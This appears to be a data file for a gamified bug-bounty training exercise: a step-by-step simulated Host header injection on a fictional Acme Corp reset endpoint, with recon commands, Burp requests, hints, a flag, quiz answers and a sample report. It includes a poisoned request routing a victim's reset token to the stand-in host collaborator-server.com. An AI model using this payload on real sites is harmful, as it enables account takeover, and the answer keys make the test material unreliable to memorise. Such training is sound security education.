// ==========================================================
// SCENARIO 002: HOST HEADER INJECTION (EASY) - V2 DATA
// ==========================================================

window.scenario_002 = {
  metadata: {
    id: "scenario-002",
    title: "Host Header Injection Reset Token Leak",
    level: "Easy",
    category: "Authentication",
    company: "Tesla",
    reward: "$1,200",
    time: "1 Hour"
  },

  decisionLog: [
    {
      hypothesis: "Password reset flows are vulnerable to parameter tampering (email replacement).",
      whyFailed: "Backend verifies email ownership against active session schemas.",
      planB: "Inspect if the Host header is dynamically parsed to construct reset URLs in emails.",
      ignored: "Brute-forcing reset tokens or token predictability check."
    }
  ],

  payloads: [
    {
      code: "Host: collaborator-server.com",
      explanation: "Tampering with the HTTP Host header to overwrite destination routing.",
      whyWorked: "The backend extracts the Host header value directly to prefix reset URLs without validating it against a whitelist.",
      alternatives: ["X-Forwarded-Host injection", "Host header duplication"]
    }
  ],

  mistakes: [
    {
      mistake: "Brute forcing the token parameter in reset links.",
      whyWrong: "Tokens are secure cryptographically generated hex blocks (64 chars).",
      betterWay: "Modify request headers to direct the token delivery to an external destination."
    }
  ],

  steps: [
    {
      name: "Mission Brief",
      time: "09:00",
      workspace: "markdown",
      xpReward: 100,
      description: `
### Target: auth.acme-corp.com
Your objective is to audit the password reset flow on Acme Corp's authorization portal.
Verify if reset links are generated dynamically using client-controlled headers.

Click **Next Step** to scan routes.
      `,
      aiAdvisor: {
        hint: "No actions needed. Proceed to next step.",
        payloadExplanation: "No payload needed.",
        failureExplanation: "No failures here."
      }
    },
    {
      name: "Passive Recon",
      time: "09:15",
      workspace: "recon",
      xpReward: 150,
      description: `
### Endpoint Discovery
Use Passive URL scanners to discover paths matching account registration, password management, or tokens.
      `,
      terminalCommands: [
        {
          name: "gau auth.acme-corp.com --subs | grep password",
          correct: true,
          evidence: {
            title: "Password Reset Endpoint",
            content: "POST https://auth.acme-corp.com/accounts/password/reset"
          },
          output: [
            { text: "[INF] Fetching paths from WayBack archives...", type: "info" },
            { text: "https://auth.acme-corp.com/accounts/password/reset", type: "out" },
            { text: "https://auth.acme-corp.com/accounts/password/reset/confirm", type: "out" },
            { text: "https://auth.acme-corp.com/accounts/password/change", type: "out" },
            { text: "[INF] Discovery completed. 3 active paths found.", type: "success" }
          ]
        }
      ],
      aiAdvisor: {
        hint: "Run the gau command to fetch archived URLs matching password reset paths.",
        payloadExplanation: "gau queries Wayback archive indices for targets.",
        failureExplanation: "Failing to check archives means missing key endpoint URLs."
      }
    },
    {
      name: "DNS Verification",
      time: "09:40",
      workspace: "markdown",
      xpReward: 150,
      description: `
### Auditing Host Header Behavior
The reset endpoint generates a link:
\`https://auth.acme-corp.com/accounts/password/reset/confirm?token=xyz...\`

If the backend maps the HTTP \`Host\` header directly into the link prefix, an attacker can modify it.
      `,
      choices: [
        {
          text: "A) Attempt SQL Injection on reset parameter",
          correct: false,
          xp: -10,
          timePenalty: 5,
          outcome: "Emails are strictly validated. SQL injection is blocked."
        },
        {
          text: "B) Intercept password reset request and modify Host header",
          correct: true,
          xp: 50,
          outcome: "Request intercepted in Burp. Proceeding to inject Host header values."
        }
      ],
      aiAdvisor: {
        hint: "Inject the Host header. Select option B.",
        payloadExplanation: "Host header injection routes dynamic links to external domains.",
        failureExplanation: "SQL injection is not applicable for email validation inputs."
      }
    },
    {
      name: "Burp Verification",
      time: "10:05",
      workspace: "burp",
      xpReward: 200,
      description: `
### Tampering Host headers
In Burp Proxy, change the Host header to point to your collaborator server \`collaborator-server.com\`.
      `,
      burpRequest: "POST /accounts/password/reset HTTP/1.1\nHost: auth.acme-corp.com\nContent-Type: application/x-www-form-urlencoded\n\nemail=victim@acme-corp.com",
      burpResponse: "HTTP/1.1 200 OK\n\n{\"status\":\"success\"}",
      burpActions: [
        {
          name: "Inject Host header",
          correct: true,
          modifiedRequest: "POST /accounts/password/reset HTTP/1.1\nHost: collaborator-server.com\nContent-Type: application/x-www-form-urlencoded\n\nemail=victim@acme-corp.com",
          modifiedResponse: "HTTP/1.1 200 OK\n\n{\"status\":\"success\"}",
          evidence: {
            title: "Poisoned Reset Header",
            content: "POST /accounts/password/reset HTTP/1.1\nHost: collaborator-server.com"
          }
        }
      ],
      aiAdvisor: {
        hint: "Click Inject Host header button to execute.",
        payloadExplanation: "We poison the request Host to rewrite destination links.",
        failureExplanation: "Failing to change Host header resolves default domains."
      }
    },
    {
      name: "Exploitation & Flag",
      time: "10:30",
      workspace: "lab",
      xpReward: 300,
      instructions: "Check collaborator server logs at collaborator-server.com. Retrieve the incoming callback containing the reset token.",
      targetUrl: "https://collaborator-server.com/logs",
      correctFlag: "FLAG{host_header_token_leakage_success}",
      aiAdvisor: {
        hint: "Enter flag: FLAG{host_header_token_leakage_success}",
        payloadExplanation: "Verification flag received from token leakage request callback.",
        failureExplanation: "Incorrect flag format fails verification."
      }
    },
    {
      name: "Report Writing",
      time: "11:00",
      workspace: "report",
      xpReward: 250,
      aiAdvisor: {
        hint: "Keywords: 'host', 'reset'.",
        payloadExplanation: "Highlight Host poisoning.",
        failureExplanation: "Missing keywords will penalize score."
      }
    },
    {
      name: "Triage & Verdict",
      time: "3 Days Later",
      workspace: "review",
      aiAdvisor: {
        hint: "Review feedback and click Finish.",
        payloadExplanation: "Feedback summary.",
        failureExplanation: "None."
      }
    },
    {
      name: "Lessons Learned",
      time: "Post-Incident",
      workspace: "quiz",
      quizData: [
        {
          question: "How does Host Header Injection lead to account takeover?",
          options: [
            "It overrides the database connection details.",
            "It tricks the backend into sending the reset email containing a link pointing to the attacker's server.",
            "It injects cross-site scripting into the email body."
          ],
          answer: 1
        }
      ],
      aiAdvisor: {
        hint: "Select option B.",
        payloadExplanation: "Tests understanding of header routing vulnerabilities.",
        failureExplanation: "Incorrect response will penalize XP."
      }
    }
  ],

  realReport: {
    title: "Host Header Injection leading to password reset token leakage and account takeover",
    severity: "High",
    type: "AuthBypass",
    desc: "The password reset email generation system on /accounts/password/reset dynamically constructs the confirmation URL using the request's HTTP Host header. By modifying this header, the reset link is emailed to the user pointing to the attacker's server.",
    steps: "1. Send a POST request to /accounts/password/reset with the Host header set to collaborator-server.com.\n2. Observe the token callback on the collaborator logs.",
    impact: "An attacker can capture reset tokens of any user to takeover accounts.",
    feedback: "High quality report. We whitelisted Host headers. Bounty awarded.",
    keywords: ["host", "reset"]
  }
};
